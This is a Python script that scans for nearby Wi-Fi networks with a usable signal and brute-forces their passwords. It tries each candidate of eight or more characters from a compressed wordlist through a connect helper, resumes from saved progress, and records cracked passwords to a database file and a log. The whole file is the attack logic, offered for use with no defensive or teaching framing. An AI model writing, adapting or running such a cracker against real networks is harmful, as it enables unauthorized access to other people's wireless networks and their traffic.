from common_tools import get_passwd, wifiConnect, wifiDisconnect, scan_wifi, skip_history_passwd
import datetime
import json
import gzip

passwd_file = r"jikefeng.txt.gz"
db_file = "scan.db"
max_times = 40
each_times = 50
need_signal = -80


def get_passwds(db_file, lines, skip_lines=0):
    times = 1
    passwd = '12345678'
    passwds = []
    with gzip.open(db_file, 'rt') as fh:
        skip_history_passwd(fh, skip_lines)
        while passwd:
            passwd = fh.readline().strip()
            if len(passwd) > 7:
                passwds.append(passwd)
                if times >= lines:
                    return passwds
            times += 1
    return passwds


if __name__ == '__main__':
    # items = get_passwd(8)
    # ps = []
    start_time = datetime.datetime.utcnow()
    # z = zipfile.ZipFile(r"C:\Users\彭卓冰\Desktop\jikefeng.txt", 'r')
    # print(z.read(z.namelist()[0]))
    # with gzip.open(r"C:\Users\彭卓冰\Desktop\gg.zip", 'tr') as fh:
    #     print(fh.readlines())
    # wifiDisconnect()

    wifis = scan_wifi(need_signal)
    for i in range(0, max_times):
        print("======= try %s times =========" % (i+1))
        for wifi_name, signal in wifis:
            last_scan_line = 0
            db_info = {}
            try:
                with open(db_file, 'r') as fh:
                    db_info = json.loads(fh.read())
                    last_scan_line = db_info.get("last_scan_line", 0)
            except:
                pass
            exist_passwd = db_info.get("exist_passwd", {})
            if wifi_name in exist_passwd.keys():
                continue
            with open("log.txt", 'a+') as fh:
                fh.write("================================\nDecode wifi name: %s, signal: %s\nStart at: %s\n" % (
                                                    wifi_name, signal, start_time))
            passwds = get_passwds(passwd_file, each_times, last_scan_line)
            status = False
            for passwd in passwds:
                if len(passwd) > 7:
                    print(passwd)
                    status = wifiConnect(passwd, wifi_name)
                    if status:
                        print("wifi password is: %s" % passwd)
                        exist_passwd[wifi_name] = passwd
                        status = True
                        break
            with open("log.txt", 'a+') as fh:
                if status:
                    fh.write("Wifi password is: %s\n" % passwd)
                now = datetime.datetime.utcnow()
                fh.write("Scan complete at %s, total seconds: %s\n" % (now, (now - start_time).total_seconds()))
        db_info["last_scan_line"] = last_scan_line + each_times
        db_info["exist_passwd"] = exist_passwd
        with open(db_file, 'w') as fh:
            fh.write(json.dumps(db_info))
